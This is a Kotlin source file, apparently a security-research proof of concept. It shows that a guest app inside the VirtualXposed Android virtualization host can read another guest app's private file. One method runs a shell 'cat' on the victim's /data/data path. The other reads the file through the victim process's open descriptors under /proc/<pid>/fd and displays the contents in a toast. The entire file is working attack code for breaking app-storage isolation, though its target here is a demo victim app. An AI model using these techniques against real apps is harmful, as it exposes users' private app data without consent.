package com.virtualxposed.guestattacker

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Context.ACTIVITY_SERVICE
import com.virtualxposed.guestattacker.Utils.executeShellCommand
import com.virtualxposed.guestattacker.Utils.getOpenFileDescriptors
import com.virtualxposed.guestattacker.Utils.log
import com.virtualxposed.guestattacker.Utils.toast
import java.io.File

object StorageBypass {
    const val VICTIM_APP = "com.virtualxposed.victim"
    const val HOST_APP = "io.va.exposed64"

    @SuppressLint("SdCardPath")
    val victimFile =
        File("/data/data/io.va.exposed64/virtual/data/user/0/com.virtualxposed.victim/files/private-file")

    fun shellBypass(context: Context) {
        val results = executeShellCommand("cat ${victimFile.absolutePath}")
        log("Private file results: $results")
        toast(
            context,
            "Private file results: $results",
        )
    }

    fun fdBypass(context: Context) {
        val activityManager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val procInfos = activityManager.runningAppProcesses

        val victimProcesses = procInfos.filter { it.processName == VICTIM_APP }

        victimProcesses.firstOrNull { victimProcess ->
            val fileDescriptors = getOpenFileDescriptors(victimProcess.pid)
            fileDescriptors.forEach { fd ->
                val fdPath = "/proc/${fd.pid}/fd/${fd.fdNumber}"
                log("File descriptor $fdPath: ${fd.targetPath}")

                if (fd.targetPath == victimFile.absolutePath) {
                    log("Got victim file descriptor ${fd.targetPath}")
                    val result = File(fdPath).readText()
                    toast(
                        context,
                        "Private file results: $result",
                    )
                    return@firstOrNull true
                }
            }
            false
        }.also { results ->
            if (results == null) {
                toast(
                    context,
                    "No file descriptor found. Try launching the victim app.",
                )
            }
        }
    }
}